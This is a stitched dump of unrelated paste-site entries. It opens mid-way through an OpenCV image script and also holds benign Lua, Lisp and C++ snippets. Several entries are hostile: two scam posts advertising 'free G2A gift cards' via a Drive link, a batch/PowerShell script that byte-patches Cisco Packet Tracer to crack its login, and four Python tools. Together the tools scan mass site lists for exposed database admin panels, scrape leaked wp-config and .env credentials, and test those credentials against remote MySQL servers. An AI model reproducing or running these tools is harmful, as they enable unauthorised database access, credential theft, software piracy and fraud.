    angle_max = np.pi / 6
    angle_min = 0
    n_angle_steps = 10
    angle_step = (angle_max - angle_min) / n_angle_steps

    t_max = 1
    t_min = 0
    n_t_steps = 10
    t_step = (t_max - t_min) / n_t_steps

    cost_min = float(""inf"")
    theta_opt = None
    t_opt = None

    theta = angle_min
    for _ in range(n_angle_steps):
        t = t_min
        for _ in range(n_t_steps):
            tau = get_tau(theta, t)
            dst = transform_image(img, region, tau)
            cost = get_cost_func(dst)
            if cost < cost_min:
                cost_min = cost
                theta_opt = theta
                t_opt = t
            t += t_step
        theta += angle_step
    return theta_opt, t_opt


def mouse_callback(event, x, y, flags, param):
    # Get the coordinates of the region (2 corner points)
    # Mouse callback function to store points on left mouse button click
    if event == cv.EVENT_LBUTTONDOWN:
        param.append((x, y))


def draw_region(img, region, color):
    region = region.astype(int)
    n = region.shape[0]  # 4 points
    for i in range(n):
        cv.line(img, region[i], region[(i + 1) % n], color, 1, cv.LINE_AA)


def main(filename: str):
    filename_wo_extension = filename.rsplit(""."", maxsplit=1)[0]
    image_path = os.path.join(TEST_IMGS_DIR, filename)

    cv.namedWindow(ORIG)
    cv.namedWindow(NOISE)
    cv.namedWindow(TILT)

    img_bgr = cv.imread(image_path)  # (H, W, C)
    img = cv.cvtColor(img_bgr, cv.COLOR_BGR2GRAY)  # (H, W)
    img = img_uint8_to_float(img)

    cv.imshow(ORIG, img_bgr)
    points = []
    cv.setMouseCallback(ORIG, mouse_callback, points)
    cv.waitKey(0)

    region = np.array(
        [
            (points[0][0], points[0][1]),
            (points[1][0], points[0][1]),
            (points[1][0], points[1][1]),
            (points[0][0], points[1][1]),
        ],
        dtype=np.float32,
    )

    theta_opt, t_opt = get_init_guess(img, region)
    tau_opt = get_tau(theta_opt, t_opt)
    init_tau_img = transform_image(img, region, tau_opt)

    cv.imshow(""Initial Guess"", init_tau_img)
    cv.waitKey(10)

    tau0 = get_tau(theta_opt, t_opt)
    A, E, tau = tilt(img, tau0, region, 0.1)

    region_tau = transform_points(region, tau)
    tfm_img = transform_image(img_bgr, region, tau)

    draw_region(img_bgr, region_tau, (0, 0, 255))

    cv.imshow(ORIG, img_bgr)
    cv.imshow(""OUTPUT"", tfm_img)
    cv.waitKey(0)
    cv.destroyAllWindows()

    A_path = os.path.join(RESULT_DIR, f""{filename_wo_extension}_A.jpg"")
    E_path = os.path.join(RESULT_DIR, f""{filename_wo_extension}_E.jpg"")
    reg_path = os.path.join(RESULT_DIR, f""{filename_wo_extension}_region.jpg"")
    tfm_path = os.path.join(RESULT_DIR, f""{filename_wo_extension}_tfm.jpg"")
    cv.imwrite(A_path, A)
    cv.imwrite(E_path, E)
    cv.imwrite(reg_path, img_bgr)
    cv.imwrite(tfm_path, tfm_img)


if __name__ == ""__main__"":
    for filename in os.listdir(TEST_IMGS_DIR):
        main(filename)
"
Yt9Gh7sD,🤑G2A.com Free Gift Card Guide 2024 May💰,atakan1983,Python,Wednesday 29th of May 2024 05:24:32 PM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Amazon gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1fu-L9saEYF3p8c22aD4kJyaloZDzbZfJ/view?usp=g2a_refund_guide_7826881.pdf

Working as of:

29 May 2024"
0fXvJU4b,💸G2A.com Free Gift Card Guide 2024 May🤑,pestinha,Python,Wednesday 29th of May 2024 05:12:24 PM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Apple gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1fu-L9saEYF3p8c22aD4kJyaloZDzbZfJ/view?usp=g2a_refund_guide_7826881.pdf

Working as of:

29 May 2024"
RQhcZLxj,Cisco Packet Tracer v8.2.2 - Bat script,cevoj35548,Batch,Wednesday 29th of May 2024 04:49:24 PM CDT,"<# ::
:: Cisco Packet Tracer v8.2.2
:: Reverse engineering & patcher by cevoj35548
:: Official installer (mirror): https://archive.org/download/cpt822/CiscoPacketTracer822_64bit_setup_signed.exe
 
:: USAGE:
:: 1. Save as a .bat file and run as admin
:: 2. Open the program. Ignore sign in popup
:: 3. Enjoy!
 
@echo off & setlocal
net file >nul 2>&1
if %errorlevel% NEQ 0 (echo;Please run as admin.&pause>nul &exit)
powershell -noprofile -nologo ""iex (${%~f0} | out-string)""
goto:eof
::#>
<# -- LIBRARY -- #>
function Expand-EnvVar($Path) {
    return [System.Environment]::ExpandEnvironmentVariables($Path)
}
New-Alias -Name ee -Value Expand-EnvVar
function ReplaceBytes($Path, $FindBytes, $ReplaceBytes) {
    $Path = ee ""$Path""
    $bytes = [System.IO.File]::ReadAllBytes($Path)
    $findPattern = [byte[]] ($FindBytes -split "" "" | ForEach-Object { [Convert]::ToByte($_, 16) })
    $replacePattern = [byte[]] ($ReplaceBytes -split "" "" | ForEach-Object { [Convert]::ToByte($_, 16) })
    $offset = 0
    while (($offset = [System.Array]::IndexOf($bytes, $findPattern[0], $offset)) -ne -1) {
        $found = $true
        for ($i = 0; $i -lt $findPattern.Length; $i++) {
            if ($bytes[$offset + $i] -ne $findPattern[$i]) {
                $found = $false
                break
            }
        }
        if ($found) {
            Write-Host Found pattern for ""$Path""
            for ($i = 0; $i -lt $replacePattern.Length; $i++) {
                $bytes[$offset + $i] = $replacePattern[$i]
            }
            $offset += $replacePattern.Length
        } else {
            $offset += 1
        }
    }
    [System.IO.File]::WriteAllBytes($Path, $bytes)
}
<# -- KILL TASKS -- #>
taskkill /f /im PacketTracer.exe 2>$null
<# -- FILES -- #>
Write-Host Replacing byte patterns...
ReplaceBytes '%programfiles%\Cisco Packet Tracer 8.2.2\bin\PacketTracer.exe' '0F 85 18 06 00 00 C7 44' 'E9 19 06 00 00 90 C7 44'
ReplaceBytes '%programfiles%\Cisco Packet Tracer 8.2.2\bin\PacketTracer.exe' '0F 84 67 01 00 00 C7 44' 'E9 68 01 00 00 90 C7 44'
Write-Host Complete! Crack by cevoj. Press any key to exit. -ForegroundColor Green
[void][System.Console]::ReadKey($true)"
08Qt6tpj,extraccp.py,raiszhe,Python,Wednesday 29th of May 2024 04:24:35 PM CDT,"filename = input(""Enter the file name to process: "")

with open(filename, 'r') as f:
    with open('output/dbforcp.txt', 'w') as g:
        data = """"
        for line in f:
            if line.strip() == """":
                continue
            if '|' not in line:
                data += line.strip()
            else:
                data += line.strip()
                data_parts = data.split('|')
                if len(data_parts) >= 4:
                    domain = data_parts[0].replace('http://','').replace('https://','').split('/')[0]
                    data_pilihan = [domain, data_parts[2], data_parts[3]]
                    data_pilihan_string = '|'.join(data_pilihan) + '\n'
                    g.write(data_pilihan_string)
                data = """"
        if data != """":
            print(f""Incomplete data: {data}"")
"
A9iupPMF,remote.py,raiszhe,Python,Wednesday 29th of May 2024 04:21:46 PM CDT,"import mysql.connector
import time
from multiprocessing.dummy import Pool as ThreadPool
from colorama import Fore, Style
import os

start = time.time()

# Request user input for the file name
file_name = input(""Enter the file name: "")

def check_db_connection(line):
    try:
        data = line.strip().split('|')
        if len(data) < 4:
            raise ValueError('Invalid data')
        url = data[0].strip()
        database = data[1].strip()
        username = data[2].strip()
        password = data[3].strip()
        port = 3306 # default port number
        if len(data) > 4:
            host_port = data[4].strip().split(':')
            if len(host_port) > 1:
                port_str = host_port[1].strip()
                if port_str.isdigit():
                    port = int(port_str)
            host = host_port[0].strip()
        else:
            host = 'localhost'

        conn = mysql.connector.connect(
            host=host,
            port=port,
            user=username,
            password=password,
            database=database
        )

        print(Fore.GREEN + f""Connected to database {database} at {host}:{port}"" + Style.RESET_ALL)
        conn.close()

        # Add connection information to the remotesqlok.txt file
        with open('output/remotesqlok.txt', 'a') as outfile:
            outfile.write(f""url : {url}\n"")
            outfile.write(f""dbname : {database}\n"")
            outfile.write(f""dbuser : {username}\n"")
            outfile.write(f""dbpass : {password}\n"")
            outfile.write(f""host : {host}\n"")
            outfile.write(f""port : {port}\n\n"")

    except mysql.connector.Error as error:
        # Display error message 
        print(Fore.RED + f""Error: Can't connect to {data[1]} at {host}:{port}"" + Style.RESET_ALL)
        return line
    except ValueError as error:
        return line
    return None
 

if not os.path.exists('output'):
    os.makedirs('output')

with open(file_name, 'r') as file:
    lines = file.readlines()

pool = ThreadPool(50)
results = pool.map(check_db_connection, lines)
pool.close()
pool.join()

# Create an empty txt file if no successful connections
if all(r is not None for r in results):
    with open('output/remotesqlok.txt', 'w'):
        pass

print(""Done, check the output/remotesqlok.txt file for results"")
"
9FzY7x3s,hostip.py,raiszhe,Python,Wednesday 29th of May 2024 04:19:43 PM CDT,"import re
import socket

filename = input(""Enter the name of the input file: "")

with open(filename, 'r') as file:
    data = file.readlines()

results = []
for line in data:
    match = re.search(r'^http://([^\/|]+)', line)
    if match:
        domain = match.group(1)
        try:
            ip = socket.gethostbyname(domain)
            print(f""[INFO] Success {domain} is {ip}"")
            parts = line.split('|')
            parts[-1] = ip
            new_line = '|'.join(parts)
            results.append(new_line)
        except socket.gaierror as e:
            print(f""[ERROR] {domain}"")

with open('output/listforremoteip.txt', 'w') as file:
    for line in results:
        file.write(line + ""\n"")
"
D1DzkwqW,extracdb.py,raiszhe,Python,Wednesday 29th of May 2024 04:15:26 PM CDT,"import re
import requests
from multiprocessing.dummy import Pool as ThreadPool
from colorama import Fore, Style
from bs4 import BeautifulSoup

def extract_info(url):
    try:
        response = requests.get(url.strip())
        content = response.text

        dbname = re.search(r""define\('DB_NAME',\s*'([^']+)'\);"", content) or re.search(r""DB_DATABASE=(.*)\n"", content)
        dbuser = re.search(r""define\('DB_USER',\s*'([^']+)'\);"", content) or re.search(r""DB_USERNAME=(.*)\n"", content)
        dbpass = re.search(r""define\('DB_PASSWORD',\s*'([^']+)'\);"", content) or re.search(r""DB_PASSWORD=(.*)"", content)
        host = re.search(r""define\('DB_HOST',\s*'([^']+)'\);"", content) or re.search(r""DB_HOST=(.*)\n"", content)

        if not all((dbname, dbuser, dbpass, host)):
            soup = BeautifulSoup(content, 'html.parser')

            db_database = soup.find('td', string='DB_DATABASE') and soup.find('td', string='DB_DATABASE').find_next_sibling('td').text.strip('""')
            db_username = soup.find('td', string='DB_USERNAME') and soup.find('td', string='DB_USERNAME').find_next_sibling('td').text.strip('""')
            db_password = soup.find('td', string='DB_PASSWORD') and soup.find('td', string='DB_PASSWORD').find_next_sibling('td').text.strip('""')
            db_host = soup.find('td', string='DB_HOST') and soup.find('td', string='DB_HOST').find_next_sibling('td').text.strip('""')

            return (db_database, db_username, db_password, db_host)

        with open('output/listforremote.txt', 'a') as f:
            f.write(f""{url.strip()}|{dbname.group(1)}|{dbuser.group(1)}|{dbpass.group(1)}|{host.group(1)}"".replace('""\n\n', '').replace('""\n', '') + ""\n"")
        print(f""{Fore.GREEN}Found:{Style.RESET_ALL} {url.strip()}"")

    except Exception as e:
        print(f""{Fore.RED}Error:{Style.RESET_ALL} {url.strip()}"")


filename = input(""Enter the file name to process: "")

with open(filename, 'r') as f:
    urls = [url.strip() for url in f.readlines()]

n_threads = 50
pool = ThreadPool(n_threads)
results = pool.map(extract_info, urls)
pool.close()
pool.join()

print(""Done! The results are saved in the file output/listforremote.txt."")
"
6yiPjTFp,sqlcek.py,raiszhe,Python,Wednesday 29th of May 2024 04:13:01 PM CDT,"import os
import requests
from multiprocessing.dummy import Pool as ThreadPool
from colorama import Fore, Style

bl = Fore.BLUE
wh = Fore.WHITE
gr = Fore.GREEN
red = Fore.RED
res = Style.RESET_ALL
yl = Fore.YELLOW

headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0'}

def screen_clear():
    os.system('cls')

def lazycfg(star, config_file):
    if ""://"" not in star:
        star = ""http://"" + star
    star = star.replace('\n', '').replace('\r', '')
    url = star + config_file
    try:
        check = requests.get(url, headers=headers, timeout=3)
        if check.status_code == 200:
            resp = check.text
            if ""pma_password"" in resp or ""auth[password]"" in resp:
                print(f""sql {gr}OK{res} => {star}\n"")
                with open(""output/sqlpathOk.txt"", ""a"") as f:
                    f.write(f'{url}\n')
            else:
                print(f""{red}Not Found{res} sql => {star}\n"")
    except requests.exceptions.RequestException as e:
        print(f""{red}ERROR{res}  => {star}\n"")

def lazycfg2(star, config_file):
    if ""://"" not in star:
        star = ""http://"" + config_file + star
    star = star.replace('\n', '').replace('\r', '')
    url = star 
    try:
        check = requests.get(url, headers=headers, timeout=3)
        if check.status_code == 200:
            resp = check.text
            if ""pma_password"" in resp or ""auth[password]"" in resp:
                print(f""sql {gr}OK{res} => {star}\n"")
                with open(""output/sqlpathOk.txt"", ""a"") as f:
                    f.write(f'{url}\n')
            else:
                print(f""{red}Not Found{res} sql => {star}\n"")
    except requests.exceptions.RequestException as e:
        print(f""{red}ERROR{res}  => {star}\n"")

def filter(star):
    lazycfg(star, ""/adminer.php"")
    lazycfg(star, ""/phpmyadmin/index.php"")
    lazycfg(star, ""/myadmin/index.php"")
    lazycfg(star, ""/dbadmin/index.php"")
    lazycfg(star, ""/sql/index.php"")
    lazycfg(star, ""/phpadmin/index.php"")
    lazycfg(star, ""/mysql/index.php"")
    lazycfg(star, ""/pma/index.php"")
    lazycfg(star, ""/phpmyadmin2/index.php"")
    lazycfg(star, ""/sqlmanager/index.php"")
    lazycfg(star, ""/mysqlmanager/index.php"")
    lazycfg(star, ""/adminer/index.php"")

    lazycfg2(star, ""adminer."")
    lazycfg2(star, ""phpmyadmin."")
    lazycfg2(star, ""myadmin."")
    lazycfg2(star, ""dbadmin."")
    lazycfg2(star, ""sql."")
    lazycfg2(star, ""phpadmin."")
    lazycfg2(star, ""mysql."")
    lazycfg2(star, ""pma."")
    lazycfg2(star, ""phpmyadmin2."")
    lazycfg2(star, ""sqlmanager."")
    lazycfg2(star, ""mysqlmanager."")
    lazycfg2(star, ""adminer."")

def main():
    list_file = input(""Give Me Your List: "")
    with open(list_file, 'r') as f:
        star = f.readlines()
    try:
        with ThreadPool(100) as pool:
            pool.map(filter, star)
    except:
        pass

if __name__ == '__main__':
    screen_clear()
    main()
"
6TaFSWW6,Casino prices,Filmos,Lua,Wednesday 29th of May 2024 04:06:42 PM CDT,"
monitors = {
    peripheral.wrap(""monitor_5""),
    peripheral.wrap(""monitor_6""),
    peripheral.wrap(""monitor_7"")
}
monitor = monitors[1]
function runAll(func, p1, p2)
    for i, mon in ipairs(monitors) do
        mon[func](p1, p2)
    end
end

function setCursorPos(x)
    _,y = monitor.getCursorPos()
    runAll('setCursorPos', x, y)
end

function advanceCursor(y)
    x,oldY = monitor.getCursorPos()
    runAll('setCursorPos', x, oldY+y)
end

function setTextColor(col)
    runAll('setTextColor', col)
end

function write(text)
    runAll('write', text)
end

function clear()
    runAll('setCursorPos', 1, 1)
    runAll('clear')
end

function title(text)
    x,y = monitor.getSize()
    posX = x/2+2-#text/2
    setCursorPos(posX)
    setTextColor(0x1)
    write(text)
    advanceCursor(1)
end

function price(key, val)
    x,y = monitor.getSize()
    valString = val .. "" rolls""
    if val == 1 then
        valString = val .. "" roll""
    end

    setCursorPos(2)
    write(key)
    setCursorPos(x-#valString)
    write(valString)
    advanceCursor(1)
end

function section(color)
    setTextColor(color)
    advanceCursor(2)
end

-- 
-- Price definition
--


function display()
    clear()
    title(""PRICES"")
    section(0x100)
    price(""2x runic tablet"", 1)
    price(""4x diamond"", 1)
    price(""128x gold"", 1)
    section(0x8)
    price(""Unique sapling"", 1)
    price(""Unique eye"", 1)
    section(0x10)
    price(""Epic+ Wickpiercer"", 2)
    price(""Mythic item"", 2)
end

display()"
nJdn8uje,windows and frames,mark-naylor-1701,Lisp,Wednesday 29th of May 2024 04:01:59 PM CDT,";; A couple of functions to supplement `current-buffer'.

(defun current-window ()
  ""Return the window associated with the active buffer.""
  (get-buffer-window))

(defun current-frame ()
  ""Return the frame associated with the active buffer.""
  (window-frame (current-window)))"
NPmTcv9w,Stack of number V2,rado_dimitrov66,C++,Wednesday 29th of May 2024 03:51:07 PM CDT,"#include <iostream>
using namespace std;

struct Sstack
{
	int key;
	Sstack* next;
}*start = NULL;

struct Pstack
{
	int key;
	Pstack* next;
}*start2 = NULL;

void addElement(unsigned int& countOfNumber)
{
	Sstack* s;
	s = start;
	int Snum;
	do
	{
		cout << ""Enter Positive Number: "";
		cin >> Snum;

	} while (Snum < 0);


	start = new Sstack;

	start->key = Snum;
	start->next = s;

	countOfNumber++;


	cout << ""Element added"" << endl;

	cout << endl;
}

void addElementToP(unsigned int& countOfNumber, unsigned int n)
{
	Pstack* s;
	s = start2;


	start2 = new Pstack;

	start2->key = n;
	start2->next = s;

	countOfNumber++;


	cout << ""Element added"" << endl;

	cout << endl;
}

void removeElement(bool isP)
{

	if (isP) {


		while (start2)
		{

			Pstack* s = start2;

			bool isLast = false;

			do
			{
				if (!s->next) {

					isLast = true;
					break;

				}

				if (s->next != start2) {
					s = s->next;
				}

			} while (s->next != start2);

			if (isLast)
			{
				start2 = NULL;

				delete s;

			}
			else {
				start2 = s;

				delete s;
			}
		}


	}
	else {


		while (start)
		{

			Sstack* s = start;

			bool isLast = false;

			do
			{
				if (!s->next) {

					isLast = true;
					break;

				}

				if (s->next != start) {
					s = s->next;
				}

			} while (s->next != start);


			if (isLast)
			{
				start = NULL;

				delete s;

			}
			else {
				start = s;

				delete s;


				start->next = NULL;
			}

		}


		cout << ""Element/s removed\n"";

	}

}

void printElements()
{
	Sstack* s = start;

	while (s)
	{
		cout << s->key << "" "";

		s = s->next;
	}

	cout << endl;

	if (start2)
	{
		Pstack* s2 = start2;

		while (s2)
		{
			cout << s2->key << "" "";

			s2 = s2->next;
		}
	}

	cout << endl;
}

void sortElementInPStack(unsigned int countOfNumber)
{
	unsigned int count = 0;

	Sstack* s = start;

	int smallest = s->key;

	s = s->next;

	removeElement(true);

	while (count < countOfNumber)
	{
		for (int i = count + 1; i < countOfNumber; i++)
		{
			if (smallest > s->key)
			{
				smallest = s->key;
			}

			s = s->next;
		}

		addElementToP(count, smallest);

		s = start;

		if (count < countOfNumber)
		{
			for (int i = 0; i < count; i++)
			{
				s = s->next;
			}

			smallest = s->key;
		}




	}




}

int main()
{
	short choice;

	unsigned int countOfNumber = 0;

	do
	{
		cout << ""[1] Add element\n[2] Remove element \n[3] Print elements\n[4] Sort by descending order\n[0] Exit\n"";
		cin >> choice;

		switch (choice)
		{
		case 1:
			system(""cls"");

			addElement(countOfNumber);

			choice = -1;

			break;
		case 2:

			system(""cls"");

			if (!start) {
				cout << ""No elements to remove\n"";
			}
			else {
				removeElement(false);
			}


			choice = -1;

			break;

		case 3:

			system(""cls"");

			if (!start) {
				cout << ""No elements to print\n"";
			}
			else {
				printElements();
			}

			choice = -1;

			break;

		case 4:

			system(""cls"");


			if (!start) {
				cout << ""No elements to sort\n"";
			}
			else {

				if (countOfNumber > 1) {
					sortElementInPStack(countOfNumber);

				}
				else {
					cout << ""Only one element\n"";
				}

			}

			choice = -1;

			break;
		default:
			break;
		}

	} while (choice < 0 || choice > 4);


}"
